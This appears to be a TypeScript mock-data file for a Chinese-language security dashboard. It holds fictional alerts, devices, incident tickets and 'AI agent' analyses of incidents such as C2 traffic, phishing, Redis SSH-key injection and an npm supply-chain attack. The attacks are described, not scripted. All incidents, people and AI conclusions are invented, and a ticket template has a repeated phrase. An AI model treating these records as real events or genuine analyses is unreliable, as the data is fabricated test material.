  { id: 'ALT051', type: 'c2_communication', title: 'C2通信 - Cloudflare Workers', description: '检测到内网主机通过Cloudflare Workers进行C2通信，利用Serverless服务规避检测。', riskLevel: 'high', status: 'investigating', source: '防火墙', sourceIp: '10.0.2.100', destinationIp: '104.16.0.1', userId: 'U004', userName: '陈刚', timestamp: '2026-05-09T01:00:00Z', rawLog: 'SRC=10.0.2.100 DST=worker.cloudflare.com PROTO=HTTPS PATTERN=beacon', tags: ['C2通信', 'Cloudflare', 'Serverless'], aiScore: 83, aiSummary: 'APT攻击者使用Cloudflare Workers作为C2通道，高度隐蔽', aiRecommendation: '封禁异常Workers域名，加强HTTPS检测', relatedAlerts: ['ALT004', 'ALT035', 'ALT043'], timeline: [{ id: 'TL053', timestamp: '2026-05-09T01:00:00Z', type: 'alert', title: 'Cloudflare C2告警', description: '防火墙检测到Cloudflare Workers C2通信', source: '防火墙' }] },
  { id: 'ALT052', type: 'phishing', title: '钓鱼邮件 - 伪造供应商对账单', description: '检测到伪造供应商对账单的钓鱼邮件，附件为带宏的PDF克隆文件。', riskLevel: 'medium', status: 'new', source: '邮件网关', sourceIp: '198.51.100.55', destinationIp: '10.0.1.55', userId: 'U018', userName: '朱婷', timestamp: '2026-05-09T10:00:00Z', rawLog: 'SRC=finance@suppl1er.com DST=zhuting@secmind.com ATTACH="对账单_0509.pdf.exe"', tags: ['钓鱼攻击', '供应商', '恶意附件'], aiScore: 75, aiSummary: '伪装PDF的EXE文件，双扩展名欺骗', aiRecommendation: '隔离邮件，检查用户是否已执行', relatedAlerts: [], timeline: [{ id: 'TL054', timestamp: '2026-05-09T10:00:00Z', type: 'alert', title: '钓鱼邮件告警', description: '邮件网关检测到伪造对账单', source: '邮件网关' }] },
  { id: 'ALT053', type: 'brute_force', title: '暴力破解 - 针对Redis', description: '检测到针对Redis服务器的未授权访问和暴力破解，尝试写入SSH公钥。', riskLevel: 'high', status: 'resolved', source: '防火墙', sourceIp: '45.33.32.102', destinationIp: '10.0.4.10', userId: 'U014', userName: '蒋华', timestamp: '2026-05-06T03:00:00Z', rawLog: 'SRC=45.33.32.102 DST=10.0.4.10 PROTO=TCP DPT=6379 ACTION=CONFIG_WRITE SSH_KEY=injected', tags: ['暴力破解', 'Redis', 'SSH公钥注入'], aiScore: 73, aiSummary: 'Redis未授权访问导致SSH公钥注入，攻击者可能获取服务器权限', aiRecommendation: '删除注入的SSH公钥，修复Redis配置', relatedAlerts: [], timeline: [{ id: 'TL055', timestamp: '2026-05-06T03:00:00Z', type: 'alert', title: 'Redis攻击告警', description: '防火墙检测到Redis未授权访问', source: '防火墙' }] },
  { id: 'ALT054', type: 'malware', title: '恶意软件 - 供应链攻击', description: '检测到npm供应链攻击，恶意包伪装为常用工具库，包含数据窃取代码。已有多台开发机安装。', riskLevel: 'high', status: 'escalated', source: 'EDR', sourceIp: '10.0.2.88', destinationIp: '10.0.2.88', userId: 'U030', userName: '林峰', timestamp: '2026-05-08T09:00:00Z', rawLog: 'HOST=DEV-WS-030 PKG=lodash-utils@1.0.0 MALWARE=credential_stealer AFFECTED=5', tags: ['恶意软件', '供应链攻击', 'npm'], aiScore: 79, aiSummary: '恶意npm包窃取开发凭证，已影响5台开发机', aiRecommendation: '卸载恶意包，重置开发凭证，审查npm配置', relatedAlerts: [], timeline: [{ id: 'TL056', timestamp: '2026-05-08T09:00:00Z', type: 'alert', title: '供应链攻击告警', description: 'EDR检测到恶意npm包', source: 'EDR' }] },
  { id: 'ALT055', type: 'vpn_anomaly', title: 'VPN异常 - 代理链路检测', description: '检测到VPN连接经过多层代理，最终来源为境外VPS，疑似使用代理隐藏真实位置。', riskLevel: 'high', status: 'investigating', source: 'VPN网关', sourceIp: '45.77.123.45', destinationIp: '10.0.0.1', userId: 'U003', userName: '王芳', timestamp: '2026-05-09T07:00:00Z', rawLog: 'USER=wangfang SRC=45.77.123.45 PROXY_CHAIN=detected REAL_IP=91.234.56.78', tags: ['VPN异常', '代理链路', '隐藏位置'], aiScore: 80, aiSummary: 'VPN连接使用代理链路，与不可能旅行告警关联', aiRecommendation: '冻结账户，联系用户确认', relatedAlerts: ['ALT003'], timeline: [{ id: 'TL057', timestamp: '2026-05-09T07:00:00Z', type: 'alert', title: '代理链路告警', description: 'VPN网关检测到代理链路', source: 'VPN网关' }] },
]

/* ========= Seed-Based Generated Alerts ========= */

const TOTAL_ALERTS = 10000

const now = new Date('2026-05-18T10:00:00Z')
const extendedAlerts: Alert[] = []
const extendedRand = seededRandom(42)
for (let i = 56; i <= TOTAL_ALERTS; i++) {
  extendedAlerts.push(generateSeededAlert(`ALT${String(i).padStart(3, '0')}`, extendedRand, now))
}

const allAlerts: Alert[] = [...staticAlerts, ...extendedAlerts]

export const mockAlerts: Alert[] = allAlerts
const ALL_ALERTS = allAlerts

/* ========= Dashboard Stats ========= */

const trendRand = seededRandom(123)
const today = new Date('2026-05-18T00:00:00Z')
const alertsTrend: { date: string; count: number }[] = []
for (let i = 29; i >= 0; i--) {
  const d = new Date(today)
  d.setDate(d.getDate() - i)
  const dateStr = d.toISOString().slice(0, 10)
  const count = 300 + Math.floor(trendRand() * 151)
  alertsTrend.push({ date: dateStr, count })
}

export const mockDashboardStats: DashboardStats = {
  totalAlerts: 10000,
  criticalAlerts: 1200,
  highAlerts: 2500,
  aiProcessedRate: 87.5,
  emailAttacks: 800,
  vpnAnomalies: 600,
  bruteForceAttempts: 900,
  avgResponseTime: 4.2,
  alertsTrend,
  riskDistribution: [
    { level: '严重', count: 1200 },
    { level: '高危', count: 2500 },
    { level: '中危', count: 3500 },
    { level: '低危', count: 2000 },
    { level: '信息', count: 800 },
  ],
  topAttackTypes: [
    { type: '钓鱼攻击', count: 1800 },
    { type: '暴力破解', count: 1600 },
    { type: 'VPN异常', count: 1400 },
    { type: '恶意软件', count: 1200 },
    { type: 'C2通信', count: 1100 },
    { type: '横向移动', count: 1000 },
    { type: '数据外泄', count: 1000 },
    { type: '权限提升', count: 900 },
  ],
}

/* ========= Devices ========= */

export const mockDevices: Device[] = [
  { id: 'DEV001', name: '核心防火墙-北京', type: '防火墙', ip: '10.0.0.1', port: 443, protocol: 'HTTPS', status: 'online', lastSync: '2026-05-18T10:00:00Z', logFormat: 'syslog', vendor: 'FortiGate' },
  { id: 'DEV002', name: '核心防火墙-上海', type: '防火墙', ip: '10.0.0.2', port: 443, protocol: 'HTTPS', status: 'online', lastSync: '2026-05-18T10:00:00Z', logFormat: 'syslog', vendor: '深信服' },
  { id: 'DEV003', name: 'VPN网关-主', type: 'VPN网关', ip: '10.0.0.5', port: 443, protocol: 'HTTPS', status: 'online', lastSync: '2026-05-18T10:00:00Z', logFormat: 'syslog', vendor: '深信服' },
  { id: 'DEV004', name: 'VPN网关-备', type: 'VPN网关', ip: '10.0.0.6', port: 443, protocol: 'HTTPS', status: 'warning', lastSync: '2026-05-18T09:45:00Z', logFormat: 'syslog', vendor: '深信服' },
  { id: 'DEV005', name: '邮件安全网关', type: '邮件网关', ip: '10.0.1.55', port: 25, protocol: 'SMTP', status: 'online', lastSync: '2026-05-18T10:00:00Z', logFormat: 'json', vendor: 'Exchange' },
  { id: 'DEV006', name: 'EDR平台-主控', type: 'EDR', ip: '10.0.5.1', port: 443, protocol: 'HTTPS', status: 'online', lastSync: '2026-05-18T10:00:00Z', logFormat: 'json', vendor: 'SentinelOne' },
  { id: 'DEV007', name: 'SOC平台', type: 'SOC', ip: '10.0.5.2', port: 443, protocol: 'HTTPS', status: 'online', lastSync: '2026-05-18T10:00:00Z', logFormat: 'json', vendor: '奇安信' },
  { id: 'DEV008', name: 'SIEM平台', type: 'SIEM', ip: '10.0.5.3', port: 443, protocol: 'HTTPS', status: 'online', lastSync: '2026-05-18T10:00:00Z', logFormat: 'cef', vendor: 'QRadar' },
  { id: 'DEV009', name: 'WAF-生产环境', type: 'WAF', ip: '10.0.1.60', port: 443, protocol: 'HTTPS', status: 'online', lastSync: '2026-05-18T10:00:00Z', logFormat: 'syslog', vendor: 'FortiGate' },
  { id: 'DEV010', name: 'DLP系统', type: 'DLP', ip: '10.0.5.4', port: 443, protocol: 'HTTPS', status: 'online', lastSync: '2026-05-18T10:00:00Z', logFormat: 'json', vendor: '奇安信' },
  { id: 'DEV011', name: '核心防火墙-深圳', type: '防火墙', ip: '10.0.0.3', port: 443, protocol: 'HTTPS', status: 'online', lastSync: '2026-05-18T10:00:00Z', logFormat: 'syslog', vendor: 'Cisco' },
  { id: 'DEV012', name: 'NAC准入控制', type: 'NAC', ip: '10.0.5.5', port: 443, protocol: 'HTTPS', status: 'offline', lastSync: '2026-05-18T08:00:00Z', logFormat: 'syslog', vendor: 'Cisco' },
  { id: 'DEV013', name: '堡垒机', type: '堡垒机', ip: '10.0.0.5', port: 22, protocol: 'SSH', status: 'online', lastSync: '2026-05-18T10:00:00Z', logFormat: 'json', vendor: '奇安信' },
]

/* ========= ITSM Tickets ========= */

const staticITSMTickets: ITSMTicket[] = [
  { id: 'TK001', title: '财务部钓鱼邮件应急响应', description: '针对财务部李娜收到的CEO冒充钓鱼邮件进行应急响应，需确认是否已转账及凭证泄露情况。', status: 'in_progress', priority: 'critical', assignee: '赵敏', alertId: 'ALT015', createdAt: '2026-05-09T07:35:00Z', updatedAt: '2026-05-09T09:00:00Z' },
  { id: 'TK002', title: 'APT攻击应急响应 - Cobalt Strike', description: '研发部陈刚工作站检测到Cobalt Strike攻击，已确认APT攻击链，需全面排查影响范围。', status: 'in_progress', priority: 'critical', assignee: '卫东', alertId: 'ALT004', createdAt: '2026-05-08T22:15:00Z', updatedAt: '2026-05-09T08:00:00Z' },
  { id: 'TK003', title: 'VPN不可能旅行调查', description: '王芳VPN不可能旅行告警，需确认账户是否被盗用。', status: 'in_progress', priority: 'high', assignee: '马骏', alertId: 'ALT003', createdAt: '2026-05-09T06:50:00Z', updatedAt: '2026-05-09T08:30:00Z' },
  { id: 'TK004', title: '勒索病毒应急处置', description: '运维部检测到WannaCry勒索病毒，EDR已隔离主机，需检查全网感染情况。', status: 'in_progress', priority: 'critical', assignee: '秦明', alertId: 'ALT019', createdAt: '2026-05-09T05:15:00Z', updatedAt: '2026-05-09T09:00:00Z' },
  { id: 'TK005', title: '数据外泄调查 - 源代码', description: '代码仓库2.3GB数据外泄至境外IP，需评估泄露范围和影响。', status: 'in_progress', priority: 'critical', assignee: '卫东', alertId: 'ALT007', createdAt: '2026-05-09T01:25:00Z', updatedAt: '2026-05-09T08:00:00Z' },
  { id: 'TK006', title: '离职员工VPN访问处理', description: '离职员工高远仍可访问VPN，需停用账号并审查访问记录。', status: 'in_progress', priority: 'high', assignee: '赵敏', alertId: 'ALT017', createdAt: '2026-05-08T20:05:00Z', updatedAt: '2026-05-09T09:00:00Z' },
  { id: 'TK007', title: 'Emotet木马清除', description: '人事部工作站感染Emotet木马，需清除并检查横向移动。', status: 'in_progress', priority: 'high', assignee: '秦明', alertId: 'ALT014', createdAt: '2026-05-08T16:45:00Z', updatedAt: '2026-05-09T08:00:00Z' },
  { id: 'TK008', title: '尼日利亚VPN异常登录调查', description: '刘洋从尼日利亚登录VPN，需确认账户安全。', status: 'in_progress', priority: 'high', assignee: '马骏', alertId: 'ALT010', createdAt: '2026-05-09T03:05:00Z', updatedAt: '2026-05-09T08:30:00Z' },
  { id: 'TK009', title: 'SSH暴力破解处理', description: '跳板机遭受SSH暴力破解，已封禁IP，需确认安全配置。', status: 'resolved', priority: 'high', assignee: '吕峰', alertId: 'ALT009', createdAt: '2026-05-08T14:25:00Z', updatedAt: '2026-05-08T16:00:00Z', resolution: '已封禁来源IP，确认跳板机安全配置正常，未发现异常登录' },
  { id: 'TK010', title: 'OA系统撞库攻击处理', description: 'OA系统遭受撞库攻击，需强制受影响用户重置密码。', status: 'resolved', priority: 'medium', assignee: '赵敏', alertId: 'ALT016', createdAt: '2026-05-07T11:25:00Z', updatedAt: '2026-05-07T15:00:00Z', resolution: '已强制12名用户重置密码，启用MFA验证' },
  { id: 'TK011', title: '数据库异常权限授予调查', description: 'DBA蒋华非工作时间异常授权，需确认是否为本人操作。', status: 'in_progress', priority: 'high', assignee: '卫东', alertId: 'ALT029', createdAt: '2026-05-08T23:05:00Z', updatedAt: '2026-05-09T08:00:00Z' },
  { id: 'TK012', title: 'WebShell清除与漏洞修复', description: 'Web服务器发现ChinaChopper WebShell，需清除并修复上传漏洞。', status: 'in_progress', priority: 'high', assignee: '秦明', alertId: 'ALT046', createdAt: '2026-05-07T18:05:00Z', updatedAt: '2026-05-08T10:00:00Z' },
  { id: 'TK013', title: 'DLP告警 - 财务数据外发', description: '郑丽向个人邮箱发送财务报表，需确认是否违反策略。', status: 'in_progress', priority: 'medium', assignee: '赵敏', alertId: 'ALT018', createdAt: '2026-05-08T17:35:00Z', updatedAt: '2026-05-09T09:00:00Z' },
  { id: 'TK014', title: 'K8s RBAC异常修复', description: 'Kubernetes集群异常ClusterRoleBinding，需撤销并检查安全配置。', status: 'in_progress', priority: 'high', assignee: '杨帆', alertId: 'ALT040', createdAt: '2026-05-08T19:05:00Z', updatedAt: '2026-05-09T08:00:00Z' },
  { id: 'TK015', title: 'npm供应链攻击处置', description: '恶意npm包已安装至5台开发机，需卸载并重置凭证。', status: 'in_progress', priority: 'high', assignee: '冯涛', alertId: 'ALT054', createdAt: '2026-05-08T09:05:00Z', updatedAt: '2026-05-09T08:00:00Z' },
  { id: 'TK016', title: 'VPN暴力破解处理', description: 'VPN网关遭受暴力破解，已封禁IP，需加强安全策略。', status: 'resolved', priority: 'critical', assignee: '吕峰', alertId: 'ALT002', createdAt: '2026-05-09T03:20:00Z', updatedAt: '2026-05-09T06:00:00Z', resolution: '已封禁Tor出口节点IP段，启用MFA强制验证，检查相关账户无异常' },
  { id: 'TK017', title: 'RAT远控木马清除', description: '产品部工作站检测到NJRat远控木马，需隔离清除。', status: 'in_progress', priority: 'high', assignee: '秦明', alertId: 'ALT038', createdAt: '2026-05-08T11:05:00Z', updatedAt: '2026-05-09T08:00:00Z' },
  { id: 'TK018', title: 'AWS IAM权限提升调查', description: 'AWS IAM异常权限提升，需撤销并检查云资源安全。', status: 'in_progress', priority: 'high', assignee: '杨帆', alertId: 'ALT050', createdAt: '2026-05-08T20:05:00Z', updatedAt: '2026-05-09T08:00:00Z' },
  { id: 'TK019', title: '钓鱼邮件 - OA登录页应急响应', description: '针对财务部钓鱼邮件进行应急响应，与TK001同一攻击者。', status: 'in_progress', priority: 'critical', assignee: '赵敏', alertId: 'ALT001', createdAt: '2026-05-09T08:25:00Z', updatedAt: '2026-05-09T09:00:00Z' },
  { id: 'TK020', title: 'Redis未授权访问修复', description: 'Redis服务器遭受未授权访问，需删除注入的SSH公钥。', status: 'resolved', priority: 'high', assignee: '蒋华', alertId: 'ALT053', createdAt: '2026-05-06T03:05:00Z', updatedAt: '2026-05-06T08:00:00Z', resolution: '已删除注入的SSH公钥，修复Redis配置，添加认证机制' },
  { id: 'TK021', title: '挖矿木马清除', description: '运维服务器挖矿木马清除，需修复Docker API配置。', status: 'resolved', priority: 'medium', assignee: '吕峰', alertId: 'ALT027', createdAt: '2026-05-07T22:05:00Z', updatedAt: '2026-05-08T10:00:00Z', resolution: '已清除xmrig进程，修复Docker API未授权访问漏洞' },
  { id: 'TK022', title: '多设备VPN登录确认', description: '张伟VPN多设备同时在线，需确认是否为本人操作。', status: 'resolved', priority: 'medium', assignee: '马骏', alertId: 'ALT024', createdAt: '2026-05-08T14:05:00Z', updatedAt: '2026-05-08T15:00:00Z', resolution: '已联系用户确认，为正常多设备办公使用，建议启用单设备策略' },
]

function generateTicket(index: number): ITSMTicket {
  const pri = pick(['critical','high','medium','low'] as const)
  const alertRef = mockAlerts.length > index ? mockAlerts[index] : pick(mockAlerts)
  const date = randomDate(30, 0)
  const isResolved = pri === 'low' || pri === 'medium'
  const status = isResolved ? 'resolved' : pick(['open','in_progress','in_progress','in_progress'])
  return {
    id: `TK${String(index + 23).padStart(3, '0')}`,
    title: `${pick(['调查','处置','分析','响应'])} - ${alertRef.title.slice(0, 20)}`,
    description: `针对${pick(['安全告警','异常事件','违规行为'])}进行${pick(['深入调查','应急响应','分析研判','处置修复'])}, 告警${pick(['深入调查','应急响应','分析研判','处置修复'])}, 告警ID: ${alertRef.id}。`,
    status: status as ITSMTicket['status'],
    priority: pri,
    assignee: pick(ASSIGNEES),
    alertId: alertRef.id,
    createdAt: formatISO(date),
    updatedAt: formatISO(randomDate(25, 0)),
    ...(status === 'resolved' ? { resolution: `${pick(['已完成处置','已修复漏洞','已清除恶意软件','已恢复系统'])}，建议${pick(['加强监控','定期复查','更新策略'])}` } : {}),
  }
}

function generateTickets(count: number): ITSMTicket[] {
  const result: ITSMTicket[] = []
  for (let i = 0; i < count; i++) result.push(generateTicket(i))
  return result
}

export const mockITSMTickets: ITSMTicket[] = [...staticITSMTickets, ...generateTickets(80)]

/* ========= AI Analyses ========= */

const staticAIAnalyses: AIAnalysis[] = [
  { id: 'AI001', alertId: 'ALT001', conclusion: '高度确认为针对性钓鱼攻击（Spear Phishing），攻击者使用高仿域名secm1nd.com冒充内部OA系统，目标为财务部敏感岗位人员。攻击链完整，包含邮件投递→凭证窃取→VPN异常登录。', riskScore: 92, riskLevel: 'critical', attackChain: ['钓鱼邮件投递','用户点击恶意链接','输入凭证至钓鱼页面','攻击者获取VPN凭证','从异常地区登录VPN'], recommendations: ['立即隔离用户邮箱并重置密码','检查VPN登录日志确认异常访问','全网搜索同类钓鱼邮件','加强邮件安全网关规则','对财务部进行安全意识培训'], relatedEvents: ['ALT008','ALT010','ALT015','ALT022'], userContext: '李娜为财务部经理，拥有财务系统高权限账户，属于高价值目标', timestamp: '2026-05-09T08:25:30Z', agentType: '威胁分析Agent' },
  { id: 'AI002', alertId: 'ALT002', conclusion: 'VPN网关遭受自动化暴力破解攻击，来源IP为Tor出口节点。5分钟内超过200次尝试。', riskScore: 88, riskLevel: 'critical', attackChain: ['Tor网络隐藏来源','自动化工具扫描VPN','字典攻击尝试登录','寻找弱密码账户'], recommendations: ['封禁Tor出口节点IP段','强制启用MFA验证','检查是否有账户被破解','限制VPN登录失败次数','设置账户锁定策略'], relatedEvents: ['ALT009','ALT025'], userContext: '陈刚的VPN账户为攻击目标之一', timestamp: '2026-05-09T03:18:00Z', agentType: '暴力破解分析Agent' },
  { id: 'AI003', alertId: 'ALT003', conclusion: '不可能旅行告警确认，用户王芳2小时内从北京和莫斯科两地登录VPN，账户极大概率已被盗用。', riskScore: 85, riskLevel: 'high', attackChain: ['用户凭证泄露','攻击者从莫斯科使用窃取凭证','绕过VPN认证','访问内部系统'], recommendations: ['立即冻结王芳VPN账户','联系用户确认近期操作','检查该账户所有近期访问记录','重置所有相关密码'], relatedEvents: ['ALT022','ALT055'], userContext: '王芳为人事部HRBP，拥有员工信息访问权限', timestamp: '2026-05-09T06:48:00Z', agentType: 'VPN异常分析Agent' },
  { id: 'AI004', alertId: 'ALT004', conclusion: '确认APT攻击，陈刚工作站感染Cobalt Strike Beacon，攻击者已建立C2通道并开始横向移动。', riskScore: 97, riskLevel: 'critical', attackChain: ['钓鱼邮件或漏洞利用初始入侵','植入Cobalt Strike Beacon','权限提升至管理员','PTH横向移动至文件服务器','DNS隧道C2通信','数据外泄至境外服务器'], recommendations: ['立即隔离受影响工作站','提取内存镜像进行取证','阻断所有C2通信','重置陈刚及关联账户密码','全面排查内网横向移动痕迹'], relatedEvents: ['ALT005','ALT006','ALT007','ALT011','ALT035','ALT041','ALT043','ALT048','ALT051'], userContext: '陈刚为研发部架构师，拥有代码仓库和内网服务器高权限', timestamp: '2026-05-08T22:12:00Z', agentType: 'APT分析Agent' },
  { id: 'AI005', alertId: 'ALT007', conclusion: '确认大规模数据外泄事件，攻击者从代码仓库服务器向境外IP传输约2.3GB数据，泄露内容可能包含核心源代码。', riskScore: 99, riskLevel: 'critical', attackChain: ['APT攻击者获取代码仓库访问权限','打包核心源代码','通过HTTPS加密通道外传','数据传输至C2基础设施'], recommendations: ['立即阻断所有外联通信','评估泄露数据范围和影响','启动数据泄露应急响应','通知管理层和法务部门','检查代码仓库完整性'], relatedEvents: ['ALT004','ALT005','ALT041'], userContext: '代码仓库包含公司核心产品源代码', timestamp: '2026-05-09T01:22:00Z', agentType: '数据外泄分析Agent' },
  { id: 'AI006', alertId: 'ALT010', conclusion: 'VPN异常登录确认，刘洋从尼日利亚拉各斯登录VPN，账户极大概率已被盗用。', riskScore: 82, riskLevel: 'high', attackChain: ['用户凭证泄露','攻击者从尼日利亚使用窃取凭证','凌晨时段登录降低被发现概率','访问内部系统'], recommendations: ['立即冻结刘洋VPN账户','联系用户确认','检查该账户近期所有操作','重置密码和MFA'], relatedEvents: ['ALT022','ALT001'], userContext: '刘洋为市场部总监，拥有市场策略和客户数据访问权限', timestamp: '2026-05-09T03:03:00Z', agentType: 'VPN异常分析Agent' },
  { id: 'AI007', alertId: 'ALT015', conclusion: 'BEC攻击确认，攻击者冒充CEO黄强要求财务部紧急转账，为典型BEC攻击手法。', riskScore: 91, riskLevel: 'critical', attackChain: ['注册高仿域名secm1nd.com','冒充CEO发送紧急转账邮件','利用权威压力迫使财务人员执行','资金转移至攻击者账户'], recommendations: ['立即通知财务部停止任何转账操作','确认CEO未发送此邮件','封禁高仿域名邮件','加强财务转账审批流程'], relatedEvents: ['ALT001','ALT008'], userContext: '李娜为财务经理，拥有资金转账审批权限', timestamp: '2026-05-09T07:32:00Z', agentType: '钓鱼分析Agent' },
  { id: 'AI008', alertId: 'ALT019', conclusion: '勒索病毒WannaCry变种确认，正在通过网络共享加密文件。EDR已自动隔离。', riskScore: 98, riskLevel: 'critical', attackChain: ['攻击者通过恶意脚本植入勒索病毒','利用SMB漏洞在内网传播','加密网络共享文件','显示勒索信息要求支付赎金'], recommendations: ['确认EDR隔离生效','全网扫描WannaCry变种特征','检查SMB端口445是否暴露','确保系统补丁已更新'], relatedEvents: ['ALT020','ALT021','ALT023'], userContext: '运维部工作站拥有内网服务器管理权限', timestamp: '2026-05-09T05:12:00Z', agentType: '恶意软件分析Agent' },
  { id: 'AI009', alertId: 'ALT014', conclusion: 'Emotet木马确认，通过钓鱼邮件中的恶意链接下载安装。已建立C2通信。', riskScore: 83, riskLevel: 'high', attackChain: ['用户点击钓鱼邮件中的恶意链接','下载并安装Emotet木马','建立C2通信','键盘记录窃取凭证','通过PsExec横向移动'], recommendations: ['隔离受感染工作站','清除Emotet木马','重置用户凭证','检查PsExec横向移动范围','封禁C2服务器IP'], relatedEvents: ['ALT028','ALT033'], userContext: '施蕾为人事部培训专员', timestamp: '2026-05-08T16:42:00Z', agentType: '恶意软件分析Agent' },
  { id: 'AI010', alertId: 'ALT006', conclusion: 'Pass-the-Hash横向移动确认，攻击者从陈刚工作站使用NTLM哈希认证访问文件服务器和代码仓库。', riskScore: 96, riskLevel: 'critical', attackChain: ['获取陈刚工作站NTLM哈希','使用PTH技术绕过认证','访问文件服务器获取敏感文档','访问代码仓库获取源代码'], recommendations: ['重置所有相关账户密码','启用Kerberos认证替代NTLM','检查代码仓库是否被篡改','审查文件服务器访问日志'], relatedEvents: ['ALT004','ALT005','ALT007','ALT011'], userContext: '文件服务器和代码仓库包含公司核心资产', timestamp: '2026-05-08T23:32:00Z', agentType: '横向移动分析Agent' },
  { id: 'AI011', alertId: 'ALT017', conclusion: '离职员工VPN访问确认，高远离职后仍可成功登录VPN，说明离职流程中账号停用环节存在疏漏。', riskScore: 79, riskLevel: 'high', attackChain: ['员工离职但VPN账号未停用','离职员工使用原凭证登录','访问内部代码仓库等资源'], recommendations: ['立即停用高远VPN账号','审查离职流程中的账号管理环节','检查高远近期访问记录','评估是否有数据泄露'], relatedEvents: [], userContext: '高远为原运维部系统工程师', timestamp: '2026-05-08T20:03:00Z', agentType: 'VPN异常分析Agent' },
  { id: 'AI012', alertId: 'ALT012', conclusion: '恶意Excel附件确认，包含VBA宏代码，执行后将下载第二阶段payload。', riskScore: 80, riskLevel: 'high', attackChain: ['用户打开恶意Excel附件','启用宏代码执行','下载第二阶段payload','植入远控木马或勒索病毒'], recommendations: ['隔离邮件','检查收件人是否已打开附件','如已打开则隔离工作站','封禁payload下载地址'], relatedEvents: [], userContext: '朱婷为财务部出纳，处理大量发票', timestamp: '2026-05-08T10:32:00Z', agentType: '钓鱼分析Agent' },
  { id: 'AI013', alertId: 'ALT021', conclusion: '异常sudo操作确认，运维工程师在凌晨执行了下载并执行远程脚本的命令。', riskScore: 81, riskLevel: 'high', attackChain: ['攻击者获取SSH凭证','凌晨登录工作站','使用sudo权限下载恶意脚本','执行脚本安装勒索病毒'], recommendations: ['检查账户是否被盗用','审查sudo操作日志','限制sudo权限使用','加强SSH认证安全'], relatedEvents: ['ALT019','ALT020'], userContext: '吕峰为运维部网络工程师，拥有服务器sudo权限', timestamp: '2026-05-09T04:52:00Z', agentType: '权限分析Agent' },
  { id: 'AI014', alertId: 'ALT029', conclusion: '数据库异常权限授予确认，操作来源IP非DBA常用终端，可能为凭证被盗用后的恶意操作。', riskScore: 76, riskLevel: 'high', attackChain: ['攻击者获取DBA凭证','从非授权终端登录数据库','授予普通账户管理员权限','利用高权限账户访问敏感数据'], recommendations: ['立即撤销异常授权','联系蒋华确认操作','检查数据库访问日志','加强数据库登录IP白名单'], relatedEvents: [], userContext: '蒋华为运维部DBA，拥有数据库最高权限', timestamp: '2026-05-08T23:03:00Z', agentType: '权限分析Agent' },
  { id: 'AI015', alertId: 'ALT040', conclusion: 'Kubernetes RBAC异常确认，普通ServiceAccount被绑定至cluster-admin角色。', riskScore: 77, riskLevel: 'high', attackChain: ['攻击者获取K8s API访问权限','创建ClusterRoleBinding','将ServiceAccount提升至cluster-admin','获取集群完全控制权'], recommendations: ['立即撤销异常ClusterRoleBinding','审查所有RBAC配置','启用K8s审计日志','限制API Server访问'], relatedEvents: ['ALT050'], userContext: 'K8s集群运行公司核心微服务', timestamp: '2026-05-08T19:03:00Z', agentType: '权限分析Agent' },
  { id: 'AI016', alertId: 'ALT046', conclusion: 'ChinaChopper WebShell确认，攻击者通过文件上传漏洞植入，可远程执行命令。', riskScore: 80, riskLevel: 'high', attackChain: ['利用文件上传漏洞','上传ChinaChopper WebShell','通过WebShell远程执行命令','获取服务器控制权'], recommendations: ['删除WebShell文件','修复文件上传漏洞','检查服务器是否被植入后门','审查Web服务器访问日志'], relatedEvents: [], userContext: 'Web服务器为公司对外博客服务器', timestamp: '2026-05-07T18:03:00Z', agentType: '恶意软件分析Agent' },
  { id: 'AI017', alertId: 'ALT054', conclusion: 'npm供应链攻击确认，恶意包lodash-utils包含凭证窃取代码，已影响5台开发机。', riskScore: 79, riskLevel: 'high', attackChain: ['攻击者发布恶意npm包','开发人员安装恶意包','包内代码窃取开发凭证','攻击者使用窃取凭证访问代码仓库'], recommendations: ['立即卸载恶意包','重置所有开发凭证','审查npm包安装策略','启用npm包安全审计'], relatedEvents: [], userContext: '受影响开发机包含多个项目源代码访问权限', timestamp: '2026-05-08T09:03:00Z', agentType: '供应链分析Agent' },
  { id: 'AI018', alertId: 'ALT038', conclusion: 'NJRat远控木马确认，攻击者可远程控制桌面。通过U盘传播。', riskScore: 82, riskLevel: 'high', attackChain: ['U盘传播NJRat木马','建立C2通信','远程控制桌面','键盘记录窃取凭证','通过DNS隧道外传数据'], recommendations: ['隔离受感染主机','清除NJRat木马','检查USB传播范围','封禁C2服务器','加强USB设备管控'], relatedEvents: ['ALT042'], userContext: '罗薇为产品部数据分析师', timestamp: '2026-05-08T11:03:00Z', agentType: '恶意软件分析Agent' },
  { id: 'AI019', alertId: 'ALT023', conclusion: 'WMI横向移动确认，攻击者从运维部工作站通过WMI远程执行PowerShell命令至5台服务器。', riskScore: 89, riskLevel: 'high', attackChain: ['勒索病毒获取运维工作站控制权','通过WMI远程执行PowerShell','在目标服务器下载执行勒索病毒','加密服务器文件'], recommendations: ['隔离所有受影响服务器','阻断WMI通信','检查服务器感染状态','准备备份恢复方案'], relatedEvents: ['ALT019','ALT020','ALT021'], userContext: '受影响服务器包含业务关键数据', timestamp: '2026-05-09T05:32:00Z', agentType: '横向移动分析Agent' },
  { id: 'AI020', alertId: 'ALT050', conclusion: 'AWS IAM权限提升确认，普通用户被添加至Administrator组。', riskScore: 78, riskLevel: 'high', attackChain: ['攻击者获取AWS凭证','调用IAM API添加用户至管理员组','获取AWS完全控制权','可能影响云上所有资源'], recommendations: ['立即撤销异常IAM权限','检查AWS CloudTrail日志','启用MFA for IAM','审查IAM策略最小权限原则'], relatedEvents: ['ALT040'], userContext: 'AWS账号包含公司云上全部基础设施', timestamp: '2026-05-08T20:03:00Z', agentType: '云安全分析Agent' },
  { id: 'AI021', alertId: 'ALT043', conclusion: 'GitHub Issues C2通道确认，APT攻击者利用GitHub Issues API进行命令控制和数据外传。', riskScore: 85, riskLevel: 'high', attackChain: ['攻击者创建私有GitHub仓库','通过Issues发布编码后的命令','受控主机读取Issues执行命令','通过Issue评论回传数据'], recommendations: ['封禁异常GitHub仓库','检查通信内容中的数据泄露','加强GitHub API访问监控','部署HTTPS深度检测'], relatedEvents: ['ALT004','ALT035','ALT051'], userContext: '利用合法服务作为C2通道是APT攻击常用手法', timestamp: '2026-05-08T23:03:00Z', agentType: 'C2分析Agent' },
]

/* ========= Generated AI Analyses ========= */

function generateAIAnalysis(index: number, alert: Alert): AIAnalysis {
  const aiAgent = pick(AI_AGENTS)
  const score = alert.aiScore || randInt(30, 99)
  const riskLevel = score >= 85 ? 'critical' : score >= 65 ? 'high' : score >= 40 ? 'medium' : 'low'
  const conclusions = [
    `${pick(['确认','高度疑似','疑似','可能为'])}${alert.title}，风险评分${score}。`,
